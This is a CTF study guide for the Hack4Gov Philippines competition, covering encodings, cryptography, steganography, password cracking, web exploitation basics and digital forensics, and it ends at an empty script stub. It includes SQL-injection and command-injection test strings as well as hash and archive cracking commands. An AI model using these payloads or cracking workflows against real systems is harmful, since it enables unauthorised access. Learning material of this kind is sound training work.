# Basic and Cryptography

_Complete Guide for Hack4Gov Philippines_

## Table of Contents

- [Basic CTF Skills](https://claude.ai/chat/21244d25-2816-4b47-90ce-84df27db2356#basic-ctf-skills)
- [File Analysis](https://claude.ai/chat/21244d25-2816-4b47-90ce-84df27db2356#file-analysis)
- [Encoding & Decoding](https://claude.ai/chat/21244d25-2816-4b47-90ce-84df27db2356#encoding--decoding)
- [Cryptography](https://claude.ai/chat/21244d25-2816-4b47-90ce-84df27db2356#cryptography)
- [Steganography](https://claude.ai/chat/21244d25-2816-4b47-90ce-84df27db2356#steganography)
- [Password Cracking](https://claude.ai/chat/21244d25-2816-4b47-90ce-84df27db2356#password-cracking)
- [Web Exploitation Basics](https://claude.ai/chat/21244d25-2816-4b47-90ce-84df27db2356#web-exploitation-basics)
- [Useful Commands & Scripts](https://claude.ai/chat/21244d25-2816-4b47-90ce-84df27db2356#useful-commands--scripts)

---

## Basic CTF Skills

### Essential First Steps

1. **File Identification**
    
    ```bash
    file [filename]                    # Determine file type
    binwalk [filename]                  # Analyze for embedded files
    xxd [filename] | head -20           # View hex dump
    hexdump -C [filename] | head -20    # Alternative hex view
    ```
    
    **Why this matters**: Challenge creators often disguise files by changing extensions. A `.txt` file might actually be a PNG image or an ELF binary.
    
2. **String Extraction**
    
    ```bash
    strings -a [filename]               # Extract all strings
    strings -n 10 [filename]            # Minimum 10 character strings
    strings [filename] | grep flag      # Search for flag patterns
    strings [filename] | grep -i ctf    # Case-insensitive search
    ```
    
3. **Binary Analysis**
    
    ```bash
    objdump -d [binary]                 # Disassemble binary
    ltrace ./[binary]                   # Library call trace
    strace ./[binary]                   # System call trace
    gdb [binary]                        # GNU debugger
    radare2 [binary]                    # Advanced binary analysis
    ```
    

### File Signatures (Magic Numbers)

Common file signatures to recognize:

|File Type|Hex Signature|ASCII|
|---|---|---|
|PNG|`89 50 4E 47`|`.PNG`|
|JPEG|`FF D8 FF`|`ÿØÿ`|
|PDF|`25 50 44 46`|`%PDF`|
|ZIP/JAR|`50 4B 03 04`|`PK..`|
|ELF|`7F 45 4C 46`|`.ELF`|
|PE/EXE|`4D 5A`|`MZ`|
|RAR|`52 61 72 21`|`Rar!`|
|GIF|`47 49 46 38`|`GIF8`|

**Fixing corrupted headers**:

```bash
# Example: Fix PNG header
printf '\x89\x50\x4E\x47\x0D\x0A\x1A\x0A' | dd of=corrupted.png bs=1 seek=0 count=8 conv=notrunc
```

---

## File Analysis

### Advanced File Analysis Tools

```bash
# Metadata extraction
exiftool [filename]                 # Extract metadata
pngcheck [filename.png]             # Check PNG integrity
jpeginfo [filename.jpg]             # Check JPEG integrity

# File carving and recovery
foremost -i [file] -o output_dir    # Carve files from disk image
scalpel [file]                      # Alternative file carver
photorec [file]                     # Recover deleted files

# Archive handling
7z l [archive]                      # List archive contents
unrar x [file.rar]                  # Extract RAR
tar -xvf [file.tar]                 # Extract TAR
```

---

## Encoding & Decoding

### Common Encodings

1. **Base64**
    
    ```bash
    # Encode
    echo -n "text" | base64
    
    # Decode
    echo "dGV4dA==" | base64 -d
    
    # Decode file
    base64 -d encoded.txt > decoded.bin
    ```
    
    **Characteristics**: Uses A-Z, a-z, 0-9, +, / and = for padding
    
2. **Base32**
    
    ```bash
    echo -n "text" | base32             # Encode
    echo "ORSXG5A=" | base32 -d         # Decode
    ```
    
    **Characteristics**: Uses A-Z, 2-7 and = for padding
    
3. **Hexadecimal**
    
    ```bash
    # Text to hex
    echo -n "flag" | xxd -p
    
    # Hex to text
    echo "666c6167" | xxd -r -p
    ```
    
4. **URL Encoding**
    
    ```bash
    # Decode URL
    python3 -c "import urllib.parse; print(urllib.parse.unquote('%66%6C%61%67'))"
    ```
    
5. **ASCII85**
    
    ```python
    import base64
    # Encode
    base64.a85encode(b'flag')
    # Decode
    base64.a85decode(b'<~9PJE~>')
    ```
    

### Number Systems Conversion

```python
# Python quick conversions
bin(42)        # Decimal to binary: '0b101010'
hex(42)        # Decimal to hex: '0x2a'
oct(42)        # Decimal to octal: '0o52'

int('101010', 2)   # Binary to decimal: 42
int('2a', 16)      # Hex to decimal: 42
int('52', 8)       # Octal to decimal: 42

# ASCII conversions
ord('A')           # Character to ASCII: 65
chr(65)            # ASCII to character: 'A'
```

---

## Cryptography

### Classical Ciphers

1. **Caesar Cipher / ROT13**
    
    ```bash
    # ROT13
    echo "flag" | tr 'A-Za-z' 'N-ZA-Mn-za-m'
    
    # Custom rotation (ROT-X)
    python3 -c "
    text = 'encrypted'
    for shift in range(26):
        result = ''
        for char in text:
            if char.isalpha():
                ascii_offset = ord('a') if char.islower() else ord('A')
                result += chr((ord(char) - ascii_offset + shift) % 26 + ascii_offset)
            else:
                result += char
        print(f'ROT-{shift}: {result}')
    "
    ```
    
2. **XOR Cipher**
    
    ```python
    # Single byte XOR brute force
    def xor_brute(ciphertext):
        for key in range(256):
            result = ''.join([chr(c ^ key) for c in ciphertext])
            if 'flag' in result.lower():
                print(f"Key: {key}, Result: {result}")
    
    # Multi-byte XOR
    def xor_decrypt(data, key):
        return bytes([data[i] ^ key[i % len(key)] for i in range(len(data))])
    ```
    
3. **Vigenère Cipher**
    
    - Use online tools like https://www.guballa.de/vigenere-solver
    - Or use Python with `pycipher` library

### Modern Cryptography

#### RSA

```bash
# Generate RSA keys
openssl genrsa -out private.pem 2048
openssl rsa -in private.pem -pubout -out public.pem

# Extract modulus and exponent
openssl rsa -in public.pem -pubin -text -noout

# Encrypt with public key
openssl rsautl -encrypt -pubin -inkey public.pem -in plaintext.txt -out encrypted.bin

# Decrypt with private key
openssl rsautl -decrypt -inkey private.pem -in encrypted.bin -out decrypted.txt
```

**Common RSA Attacks**:

- **Small exponent attack** (e=3)
- **Wiener's attack** (small private exponent)
- **Common modulus attack**
- **Fermat factorization**

Tools for RSA:

```bash
# RsaCtfTool - Automatic RSA attack tool
python3 RsaCtfTool.py --publickey public.pem --uncipherfile cipher.bin

# FactorDB - Check if N is already factored
# Visit: http://factordb.com
```

#### AES

```bash
# AES-256-CBC encryption
openssl enc -aes-256-cbc -salt -in plaintext.txt -out encrypted.bin -k password

# AES-256-CBC decryption
openssl enc -aes-256-cbc -d -in encrypted.bin -out decrypted.txt -k password

# With base64 encoding
openssl enc -aes-256-cbc -a -salt -in plaintext.txt -out encrypted.b64 -k password

# Using key and IV
openssl enc -aes-256-cbc -in plain.txt -out cipher.bin -K [hex_key] -iv [hex_iv]
```

#### Hash Cracking

```bash
# Identify hash type
hashid [hash]
hash-identifier

# John the Ripper
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
john --format=raw-md5 --wordlist=wordlist.txt hash.txt
john --show hash.txt

# Hashcat
hashcat -m 0 -a 0 hash.txt wordlist.txt    # MD5
hashcat -m 100 -a 0 hash.txt wordlist.txt  # SHA1
hashcat -m 1400 -a 0 hash.txt wordlist.txt # SHA256

# Online tools
# - https://crackstation.net/
# - https://hashes.com/en/decrypt/hash
# - https://md5decrypt.net/
```

### Cryptography Tools Summary

**Online Tools:**

- **CyberChef**: https://gchq.github.io/CyberChef/ (Swiss army knife)
- **dCode**: https://www.dcode.fr/ (Multiple cipher solvers)
- **Quipqiup**: https://quipqiup.com/ (Substitution cipher solver)
- **Cryptii**: https://cryptii.com/ (Encoding/Decoding)
- **Boxentriq**: https://www.boxentriq.com/ (Cipher identifier)

**Offline Tools:**

- **Ciphey**: Automatic decryption tool
    
    ```bash
    pip3 install cipheyciphey -f encrypted.txt
    ```
    
- **CrypTool**: GUI-based cryptanalysis
- **SageMath**: Mathematical cryptanalysis

---

## Steganography

### Image Steganography

```bash
# Basic analysis
file image.png
exiftool image.png
strings image.png

# Steganography tools
steghide extract -sf image.jpg              # Extract hidden data
stegsolve image.png                         # GUI tool for analysis
zsteg image.png                            # PNG steganography
zsteg -a image.png                         # Try all methods
binwalk -e image.png                       # Extract embedded files
foremost image.png                         # File carving

# LSB steganography
stegpy image.png                           # Python LSB tool
python3 lsb.py extract image.png output.txt

# Check image planes
convert image.png -channel R -separate red.png
convert image.png -channel G -separate green.png
convert image.png -channel B -separate blue.png
```

### Audio Steganography

```bash
# Analyze audio files
sox audio.wav -n stat
sox audio.wav -n spectrogram              # Generate spectrogram
audacity audio.wav                        # GUI analysis

# Extract hidden data
hideme audio.wav -x
deepsound                                 # Windows tool
```

### Text Steganography

- **Whitespace steganography**: Hidden in spaces/tabs
- **Zero-width characters**: Unicode steganography
- **Bacon cipher**: Binary encoding using two fonts

---

## Password Cracking

### Archive Password Cracking

```bash
# ZIP files
fcrackzip -D -u -p /usr/share/wordlists/rockyou.txt file.zip
fcrackzip -b -c 'aA1!' -l 1-10 file.zip   # Brute force
john --format=zip file.zip

# RAR files
rarcrack file.rar --threads 4 --type rar
john --format=rar file.rar

# 7z files
7z2john file.7z > hash.txt
john hash.txt

# PDF passwords
pdfcrack -f file.pdf -w wordlist.txt
john --format=pdf file.pdf
```

### Creating Custom Wordlists

```bash
# Cewl - scrape website for words
cewl -d 2 -m 5 -w wordlist.txt https://example.com

# Crunch - generate wordlist
crunch 8 8 -t flag@@@@ -o wordlist.txt    # flag0000 to flag9999

# John mutations
john --wordlist=base.txt --rules --stdout > mutated.txt
```

---

## Web Exploitation Basics

### Common Web CTF Techniques

```bash
# Directory/file discovery
gobuster dir -u http://target.com -w /usr/share/wordlists/dirb/common.txt
dirb http://target.com
ffuf -w wordlist.txt -u http://target.com/FUZZ

# Check robots.txt, sitemap.xml, .git, .svn, .DS_Store

# View source code
curl -s http://target.com | grep -i flag
curl -s http://target.com | grep -i <!--  # HTML comments

# Check headers
curl -I http://target.com
curl -v http://target.com

# SQL Injection basic test
' OR '1'='1
admin' --
' UNION SELECT null,null,null--

# Command injection
; ls
| ls
&& ls
|| ls
$(ls)
`ls`
```

---

## Useful Commands & Scripts

### Quick Python Scripts

**Frequency Analysis**:

```python
from collections import Counter
text = "encrypted_text_here"
freq = Counter(text.lower())
for char, count in freq.most_common():
    print(f"{char}: {count} ({count/len(text)*100:.2f}%)")
```

**Connect to Service**:

```python
from pwn import *
r = remote('ctf.example.com', 1337)
r.recvuntil(b'>')
r.sendline(b'answer')
print(r.recvline())
```

**Brute Force Script Template**:

```python
import requests
import string

charset = string.ascii_letters + string.digits + '_'
flag = 'flag{'

while not flag.endswith('}'):
    for char in charset:
        test = flag + char
        r = requests.get(f'http://target.com?input={test}')
        if 'correct' in r.text:
            flag += char
            print(f"Found: {flag}")
            break
```

### Bash One-Liners

```bash
# Find all base64 strings in file
grep -oE '[A-Za-z0-9+/]{4,}={0,2}' file.txt

# Extract all IP addresses
grep -oE '[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}' file.txt

# Hex to ASCII
echo "48656c6c6f" | xxd -r -p

# Monitor file changes
watch -n 1 'ls -la'

# Quick HTTP server
python3 -m http.server 8080
```

---

## CTF Strategy Tips

1. **Flag Format**: Usually `flag{...}`, `CTF{...}`, or custom format specified in rules
2. **Check Everything**: Comments, metadata, headers, cookies, source code
3. **Try Common Passwords**: admin, password, 123456, etc.
4. **Version Control**: Check for `.git`, `.svn` folders
5. **Documentation**: Keep notes of what you've tried
6. **Collaboration**: Work with teammates, divide tasks
7. **Time Management**: Don't get stuck on one challenge too long
8. **Learn from Writeups**: Read solutions after CTF ends

---

## Resources

### Learning Platforms

- PicoCTF: https://picoctf.org/
- OverTheWire: https://overthewire.org/
- HackTheBox: https://www.hackthebox.eu/
- TryHackMe: https://tryhackme.com/
- Root Me: https://www.root-me.org/

### Reference Materials

- GTFOBins: https://gtfobins.github.io/
- PayloadsAllTheThings: https://github.com/swisskyrepo/PayloadsAllTheThings
- HackTricks: https://book.hacktricks.xyz/
- CTF101: https://ctf101.org/

### Philippine CTF Community

- Follow local CTF groups and competitions
- Join Discord/Telegram communities
- Participate in Hack4Gov challenges

---

_Remember: Practice makes perfect. Start with easy challenges and gradually increase difficulty. Good luck with Hack4Gov!_

---

# Steganography

_A comprehensive guide for solving steganography challenges in CTF competitions_

## What is Steganography?

Steganography is the practice of concealing information within another message or physical object. In CTF challenges, data is often hidden in images, audio files, videos, or other digital media.

## General Approach

### Initial Analysis

1. **File identification**
    
    ```bash
    file [filename]  # Identify actual file type
    ```
    
2. **Metadata extraction**
    
    ```bash
    exiftool [filename]  # Extract EXIF and metadata
    exiftool -a -u [filename]  # Show all metadata including unknown tags
    ```
    
3. **Binary analysis with binwalk**
    
    ```bash
    binwalk [filename]  # Scan for embedded files
    binwalk -e [filename]  # Extract embedded files
    binwalk -D 'png image:png' [filename]  # Extract specific signature
    binwalk --dd='.*' [filename]  # Extract all signatures
    binwalk -M [filename]  # Recursively scan extracted files
    ```
    
4. **File carving with foremost**
    
    ```bash
    foremost -v [filename]  # Verbose file carving
    foremost -t all -i [filename]  # Extract all supported file types
    ```
    
5. **Strings analysis**
    
    ```bash
    strings [filename] | grep -i "flag"  # Search for flag patterns
    strings -n 8 [filename]  # Show strings at least 8 chars long
    strings -a [filename]  # Scan entire file
    ```
    

## Image Steganography

### Basic Analysis

1. **Visual inspection** - Open image, check for obvious anomalies
2. **Reverse image search**
    - TinEye: https://www.tineye.com/
    - Google Images reverse search
    - Compare MD5 hashes of similar images

### File Structure Analysis

1. **Check file signatures** (magic bytes)
    
    - PNG: `89 50 4E 47 0D 0A 1A 0A`
    - JPEG: `FF D8 FF`
    - GIF: `47 49 46 38`
    - BMP: `42 4D`
2. **PNG specific checks**
    
    ```bash
    pngcheck -v [filename.png]  # Verbose PNG validation
    pngcheck -7 [filename.png]  # Print contents of tEXt chunks
    ```
    
3. **Fix corrupted headers**
    
    ```bash
    hexedit [filename]  # Manual hex editing
    xxd [filename] | head  # View hex dump
    ```
    

### Steganography Tools

1. **Stegsolve** (Java tool)
    
    ```bash
    java -jar Stegsolve.jar
    ```
    
    - Analyze bit planes
    - Apply filters (Alpha, Red, Green, Blue planes)
    - XOR analysis
    - Stereogram solver
2. **zsteg** (PNG/BMP analysis)
    
    ```bash
    zsteg -a [filename.png]  # All analysis methods
    zsteg -E [filename.png]  # Extract data
    zsteg --lsb [filename.png]  # LSB steganography
    ```
    
3. **steghide**
    
    ```bash
    steghide info [filename]  # Check if file contains hidden data
    steghide extract -sf [filename]  # Extract without password
    steghide extract -sf [filename] -p [password]  # With password
    ```
    
4. **stegcracker** (Brute-force passwords)
    
    ```bash
    stegcracker [filename] [wordlist]
    stegcracker [filename] /usr/share/wordlists/rockyou.txt
    ```
    
5. **ImageMagick** (Image manipulation)
    
    ```bash
    convert [input] -negate [output]  # Invert colors
    convert [input] -colorspace Gray [output]  # Convert to grayscale
    compare [image1] [image2] [diff_output]  # Compare two images
    ```
    
6. **Additional tools**
    
    - **StegOnline**: https://georgeom.net/StegOnline (Upload and analyze)
    - **Steganalyse**: Statistical steganalysis
    - **OpenStego**: GUI tool for hiding/extracting data
    - **SilentEye**: Cross-platform steganography software
    - **Steganosuite**: `steganosuite -x [filename]` (Extract data)

### Advanced Image Techniques

1. **LSB (Least Significant Bit) Analysis**
    
    - Check RGB color channels separately
    - Look for patterns in LSB bits
2. **JPEG Steganography**
    
    ```bash
    jsteg reveal [filename.jpg] [output]  # JSteg extraction
    outguess -r [filename.jpg] [output]  # OutGuess extraction
    stegdetect [filename.jpg]  # Detect steganography method
    ```
    
3. **QR Codes in Images**
    
    - Use online QR decoders
    - `zbarimg [filename]` - Scan for barcodes/QR codes
4. **Text Recognition (OCR)**
    
    ```bash
    tesseract [image] [output] -l eng  # OCR with English
    tesseract [image] stdout  # Output to terminal
    ```
    

## Audio Steganography

### Analysis Tools

1. **Audacity** (Audio editor)
    
    - Analyze → Plot Spectrum
    - View → Show Spectrogram
    - Check for hidden messages in spectrograms
    - Look for patterns at specific frequencies
2. **Sonic Visualiser**
    
    - Layer → Add Spectrogram
    - Pane → Add Peak Frequency Spectrogram
    - Check different transform parameters
3. **DeepSound** (Windows)
    
    - Extract hidden files from audio
    - Supports password protection
4. **SilentEye**
    
    - Cross-platform audio steganography
5. **Additional audio tools**
    
    ```bash
    sox [input.wav] -n spectrogram  # Generate spectrogram
    multimon-ng -t wav [file.wav]  # Decode digital transmissions
    ```
    

### Audio Techniques

- **DTMF Tones**: Decode phone keypad tones
- **Morse Code**: Listen for dots and dashes
- **SSTV (Slow Scan TV)**: Hidden images in audio
- **Backmasking**: Reversed audio messages

## Compressed Files

### ZIP Files

1. **Analysis**
    
    ```bash
    zipdetails -v [file.zip]  # Internal structure details
    zipinfo [file.zip]  # Detailed zip information
    7z l [file.zip]  # List contents with 7zip
    ```
    
2. **Repair corrupted zips**
    
    ```bash
    zip -FF [input.zip] --out [output.zip]
    zip -F [input.zip] --out [output.zip]  # Less aggressive repair
    ```
    
3. **Password cracking**
    
    ```bash
    fcrackzip -D -u -p /usr/share/wordlists/rockyou.txt [file.zip]
    john --wordlist=/usr/share/wordlists/rockyou.txt [hash]
    hashcat -m 17200 [hash] [wordlist]  # PKZIP
    ```
    

### Other Archives

1. **7z files**
    
    ```bash
    7z2hashcat32-1.3.exe [filename.7z] > [hash.txt]
    john --wordlist=/usr/share/wordlists/rockyou.txt [hash.txt]
    ```
    
2. **RAR files**
    
    ```bash
    rar2john [file.rar] > [hash.txt]
    john [hash.txt]
    ```
    

## Text Steganography

1. **Whitespace steganography**
    
    - SNOW: `snow -C [file.txt]`
    - Check for tabs vs spaces patterns
2. **Zero-width characters**
    
    - Unicode steganography
    - Check for U+200B, U+200C, U+200D characters
3. **Spam steganography**
    
    - http://www.spammimic.com/
4. **Bacon cipher** - Binary encoding using two fonts/cases
    
5. **Null cipher** - Hidden message in first letters
    

## PDF Files

### PDF Analysis Tools

1. **qpdf**
    
    ```bash
    qpdf --show-all-pages [file.pdf]
    qpdf --filtered-stream-data [file.pdf]
    qpdf --decrypt [input.pdf] [output.pdf]
    ```
    
2. **PDFStreamDumper** (Windows GUI)
    
    - Analyze PDF streams
    - Extract embedded files
    - JavaScript analysis
3. **pdfinfo & pdfimages**
    
    ```bash
    pdfinfo [file.pdf]  # Document information
    pdfimages -all [file.pdf] [prefix]  # Extract all images
    pdfimages -j [file.pdf] [prefix]  # Extract as JPEG
    ```
    
4. **pdfcrack**
    
    ```bash
    pdfcrack -f [file.pdf] -w /usr/share/wordlists/rockyou.txt
    ```
    
5. **Advanced PDF tools**
    
    ```bash
    pdfdetach -list [file.pdf]  # List attachments
    pdfdetach -saveall [file.pdf]  # Extract attachments
    pdftotext [file.pdf] [output.txt]  # Extract text
    pdf-parser.py -v [file.pdf]  # Detailed analysis
    peepdf -if [file.pdf]  # Interactive console
    pdfid [file.pdf]  # Scan for suspicious elements
    ```
    

## Video Steganography

1. **Extract frames**
    
    ```bash
    ffmpeg -i [video.mp4] frame_%04d.png
    ```
    
2. **Check audio track separately**
    
    ```bash
    ffmpeg -i [video.mp4] -vn -acodec copy [audio.mp3]
    ```
    
3. **OpenPuff** - Multi-carrier steganography
    

## Network Steganography

1. **PCAP analysis**
    
    ```bash
    tshark -r [file.pcap] -Y "http"
    tcpdump -r [file.pcap] -A  # ASCII output
    ```
    
2. **Protocol steganography**
    
    - Check ICMP payloads
    - DNS tunneling
    - HTTP headers

## File System & Disk Images

1. **Mount and analyze**
    
    ```bash
    mount [image.img] /mnt/point
    autopsy [disk.img]  # Forensic browser
    ```
    
2. **File recovery**
    
    ```bash
    photorec [disk.img]
    testdisk [disk.img]
    ```
    

## Advanced Techniques

### Custom Encoding

1. **Base encodings**
    
    - Base64, Base32, Base85
    - Custom alphabets
2. **Esoteric languages**
    
    - Brainfuck, Malbolge, Whitespace
    - Piet (images as code)

### Cryptography Integration

1. **XOR operations**
    
    ```python
    # XOR with key
    result = bytes([a ^ b for a, b in zip(data, key)])
    ```
    
2. **Classical ciphers**
    
    - Caesar, Vigenere, Substitution
    - Use CyberChef for quick analysis

## Online Tools & Resources

### Multi-purpose

- **CyberChef**: https://gchq.github.io/CyberChef/
- **StegOnline**: https://georgeom.net/StegOnline
- **Steganography Toolkit**: https://github.com/DominicBreuker/stego-toolkit

### Image Specific

- https://futureboy.us/stegano/decinput.html
- http://stylesuxx.github.io/steganography/
- https://www.mobilefish.com/services/steganography/steganography.php
- https://manytools.org/hacker-tools/steganography-encode-text-into-image/
- http://magiceye.ecksdee.co.uk/ (Stereograms)

### Audio Specific

- https://steganosaur.us/dissertation/tools/audio

## CTF Strategy Tips

1. **Start simple** - Check obvious things first (strings, file, exiftool)
2. **Keep notes** - Document what you've tried
3. **Look for patterns** - Repeated bytes, suspicious sections
4. **Check everything** - Filenames, timestamps, comments
5. **Think creatively** - Challenges often combine multiple techniques
6. **Use automation** - Write scripts for repetitive tasks
7. **Collaborate** - Different perspectives help

## Common CTF Patterns

1. **Multi-layer challenges** - One file hidden in another, recursively
2. **Password chains** - Password for one file found in another
3. **Split flags** - Parts of flag in different locations
4. **Red herrings** - Intentional false leads
5. **Wordplay** - Passwords often relate to challenge theme

## Quick Reference Commands

```bash
# Quick scan workflow
file challenge.file
strings challenge.file | grep -i flag
binwalk -e challenge.file
foremost challenge.file
exiftool challenge.file

# For images
stegsolve.jar  # GUI analysis
zsteg -a image.png
steghide extract -sf image.jpg

# For audio
sonic-visualiser audio.wav
audacity audio.wav

# For archives
fcrackzip -D -u -p rockyou.txt file.zip
```

---

_Remember: In CTF challenges, if something seems unusual or out of place, it's probably intentional. Keep trying different approaches and tools until you find the flag!_

---

# Digital Forensics

## 1. Initial File Analysis & Triage

### First Steps with Any Evidence File

```bash
# Always start with these commands
file <filename>                    # Identify file type
exiftool <filename>                 # Extract metadata
strings -a <filename> | less        # Extract ASCII strings
strings -a -el <filename> | less    # Extract Unicode strings (Windows)
binwalk <filename>                  # Identify embedded files
xxd <filename> | head -50          # View hex dump
```

### When `file` command returns "data"

- Try `binwalk -e <filename>` to extract embedded files
- Use `foremost -i <filename> -o output_dir` for file carving
- Check with `photorec` for deeper recovery
- Try `scalpel` with custom configuration
- Use `bulk_extractor -o output_dir <filename>` for artifact extraction

## 2. Memory Forensics

### Volatility 3 (Recommended)

```bash
# Identify profile/OS
vol.py -f memory.raw windows.info
vol.py -f memory.raw linux.info

# Windows Memory Analysis
vol.py -f memory.raw windows.pslist              # List processes
vol.py -f memory.raw windows.pstree              # Process tree
vol.py -f memory.raw windows.cmdline             # Command line args
vol.py -f memory.raw windows.netscan             # Network connections
vol.py -f memory.raw windows.filescan            # Scan for files
vol.py -f memory.raw windows.dumpfiles --pid <PID>  # Dump process files
vol.py -f memory.raw windows.hashdump            # Dump password hashes
vol.py -f memory.raw windows.registry.hivelist   # List registry hives
vol.py -f memory.raw windows.registry.printkey   # Print registry keys
vol.py -f memory.raw windows.malfind            # Find injected code
vol.py -f memory.raw windows.vadinfo --pid <PID> # Virtual address descriptor

# Linux Memory Analysis
vol.py -f memory.raw linux.pslist               # Process list
vol.py -f memory.raw linux.bash                 # Bash history
vol.py -f memory.raw linux.elfs                 # Extract ELF binaries
```

### Volatility 2 (Legacy)

```bash
volatility -f memory.raw imageinfo              # Get profile
volatility -f memory.raw --profile=<profile> pslist
volatility -f memory.raw --profile=<profile> consoles  # Console history
volatility -f memory.raw --profile=<profile> clipboard # Clipboard content
```

## 3. Disk Image Analysis

### Mounting and Extraction

```bash
# E01 (EnCase) Images
ewfmount image.E01 /mnt/ewf
mount -o ro,loop /mnt/ewf/ewf1 /mnt/evidence

# Raw Images
mount -o ro,loop image.raw /mnt/evidence

# Fix corrupted filesystems
e2fsck -f image.raw              # ext2/3/4
ntfsfix image.raw                 # NTFS
fsck.vfat image.raw              # FAT32
```

### Autopsy (GUI Alternative)

- Create new case → Add data source → Select image
- Automated analysis modules:
    - Recent Activity
    - Hash Lookup
    - Keyword Search
    - Email Parser
    - Registry Analysis

### FTK Imager

- File → Add Evidence Item → Image File
- Export files: Right-click → Export Files
- Create forensic images: File → Create Disk Image

## 4. File Carving & Recovery

### Foremost Configuration

```bash
# Edit /etc/foremost.conf for custom signatures
foremost -t all -i disk.raw -o output/
foremost -t pdf,jpg,png,doc -i disk.raw -o output/
```

### Photorec (Better for corrupted filesystems)

```bash
photorec disk.raw
# Select partition → File system type → Choose file types
```

### Scalpel (Faster, configurable)

```bash
# Edit /etc/scalpel/scalpel.conf
scalpel -b -o output/ disk.raw
```

### Bulk Extractor

```bash
bulk_extractor -o output/ -R disk.raw
# Extracts: emails, URLs, credit cards, phone numbers, etc.
# Check output/ for:
#   - email.txt, url.txt, domain.txt
#   - ccn.txt (credit cards)
#   - telephone.txt
#   - packets.pcap (network packets)
```

## 5. Windows Artifacts

### Registry Analysis

```bash
# RegRipper
rip.pl -r NTUSER.DAT -p userassist > output.txt
rip.pl -r SYSTEM -p services > services.txt
rip.pl -r SOFTWARE -p uninstall > uninstall.txt

# Manual Analysis - Key Locations
# User Activity:
NTUSER.DAT\Software\Microsoft\Windows\CurrentVersion\Explorer\RecentDocs
NTUSER.DAT\Software\Microsoft\Windows\CurrentVersion\Explorer\TypedPaths
NTUSER.DAT\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU

# System Info:
SYSTEM\CurrentControlSet\Services
SOFTWARE\Microsoft\Windows\CurrentVersion\Run
SAM\Domains\Account\Users
```

### Event Log Analysis

```powershell
# Key Event IDs
4624 - Successful logon
4625 - Failed logon
4634 - Logoff
4648 - Explicit credentials logon
4672 - Special privileges assigned
4720 - User account created
4732 - User added to group
7045 - Service installed

# PowerShell Analysis Tools
.\DeepBlueCLI.ps1 .\Security.evtx
.\Chainsaw.exe hunt .\Logs\ --mapping sigma
.\hayabusa.exe -d .\Logs\ -o timeline.csv
```

### Windows Artifacts Locations

```
C:\Windows\Prefetch\               - Program execution
C:\Windows\System32\config\        - Registry hives
C:\Windows\System32\winevt\Logs\   - Event logs
C:\$Recycle.Bin\                   - Deleted files
C:\Windows\Tasks\                  - Scheduled tasks
C:\Windows\Temp\                   - Temporary files
%USERPROFILE%\AppData\             - Application data
%USERPROFILE%\NTUSER.DAT           - User registry
```

## 6. Linux Artifacts

### Important Locations

```bash
/var/log/              # System logs
/var/log/auth.log      # Authentication logs
/var/log/syslog        # System messages
/var/log/apache2/      # Web server logs
/home/*/.bash_history  # Command history
/etc/passwd           # User accounts
/etc/shadow           # Password hashes
/etc/crontab          # Scheduled tasks
/tmp/                 # Temporary files
~/.ssh/               # SSH keys and config
```

### Log Analysis Commands

```bash
# Failed login attempts
grep "Failed password" /var/log/auth.log

# Successful logins
grep "Accepted password" /var/log/auth.log

# Commands run with sudo
grep "COMMAND" /var/log/auth.log

# System timeline
grep -h "" /var/log/* | sort -k1,2
```

## 7. Web Browser Forensics

### Chrome/Chromium

```
Windows: %USERPROFILE%\AppData\Local\Google\Chrome\User Data\Default\
Linux: ~/.config/google-chrome/Default/
Files:
- History (SQLite DB)
- Cookies
- Cache/
- Bookmarks (JSON)
- Login Data (passwords)
```

### Firefox

```
Windows: %APPDATA%\Mozilla\Firefox\Profiles\*.default\
Linux: ~/.mozilla/firefox/*.default/
Files:
- places.sqlite (history/bookmarks)
- cookies.sqlite
- formhistory.sqlite
- cache2/
```

### Browser Analysis Tools

```bash
# SQLite browser for manual analysis
sqlitebrowser History

# Hindsight (Chrome forensics)
python hindsight.py -i "Chrome\User Data\Default" -o output.xlsx

# Nirsoft Tools (Windows)
BrowsingHistoryView.exe
ChromeCacheView.exe
```

## 8. Mobile Forensics

### Android

```bash
# ADB for logical extraction
adb backup -apk -shared -all -system backup.ab
dd if=backup.ab bs=24 skip=1 | openssl zlib -d > backup.tar

# Important locations
/data/data/                    # App data
/data/media/0/                 # User files
/data/system/                  # System databases
/data/misc/wifi/               # WiFi configs
```

### iOS

- Use tools like iBackupBot, iPhone Backup Extractor
- iTunes backup locations:
    - Windows: `%APPDATA%\Apple Computer\MobileSync\Backup\`
    - Mac: `~/Library/Application Support/MobileSync/Backup/`

## 9. Network Forensics

### PCAP Analysis

```bash
# Wireshark filters
http.request.method == "POST"      # POST requests
dns                                 # DNS queries
tcp.flags.syn == 1                 # SYN packets
ftp                                # FTP traffic

# Command line
tshark -r capture.pcap -Y "http.request"
tcpdump -r capture.pcap -A         # ASCII output
```

### Network Artifacts from Memory

```bash
vol.py -f memory.raw windows.netscan
vol.py -f memory.raw linux.netstat
```

## 10. Steganography & Hidden Data

### Common Tools

```bash
steghide extract -sf image.jpg     # Extract hidden data
stegsolve                          # GUI analysis tool
zsteg image.png                    # PNG steganography
binwalk -e file                   # Extract embedded files
strings -n 8 file | grep -i flag  # Search for flags
exiftool -all= image.jpg          # Check/remove metadata
```

### Audio Steganography

```bash
sonic-visualiser                   # Spectrogram analysis
audacity                          # Audio editor with spectogram
hideme                           # Audio steganography tool
```

## 11. Quick CTF Tips for PH Hack4Gov

### Common Flag Formats

- `hack4gov{...}`
- `CTF{...}`
- `FLAG{...}`
- Base64 encoded flags
- MD5/SHA hashes as flags

### Quick Wins Checklist

1. ✅ Run `strings` and grep for "flag", "password", "ctf"
2. ✅ Check file metadata with `exiftool`
3. ✅ Look for hidden files (`.hidden`, `..`, spaces in names)
4. ✅ Check alternate data streams (Windows)
5. ✅ Look in slack space of files
6. ✅ Check for magic bytes manipulation
7. ✅ Try common passwords: admin, password, 123456
8. ✅ Check for base64/hex encoded strings
9. ✅ Look for GPS coordinates in images
10. ✅ Check browser saved passwords

### Time-Saving Commands

```bash
# Recursive string search
grep -r "flag{" ./ 2>/dev/null

# Find recently modified files
find . -type f -mtime -1

# Extract all URLs from memory dump
strings memory.raw | grep -Eo 'https?://[^ ]+' 

# Quick base64 decode
echo "encoded_string" | base64 -d

# Find all images and check EXIF
find . -name "*.jpg" -o -name "*.png" -exec exiftool {} \;
```

### Automation Scripts

```bash
#!/bin/bash
# Quick forensics script
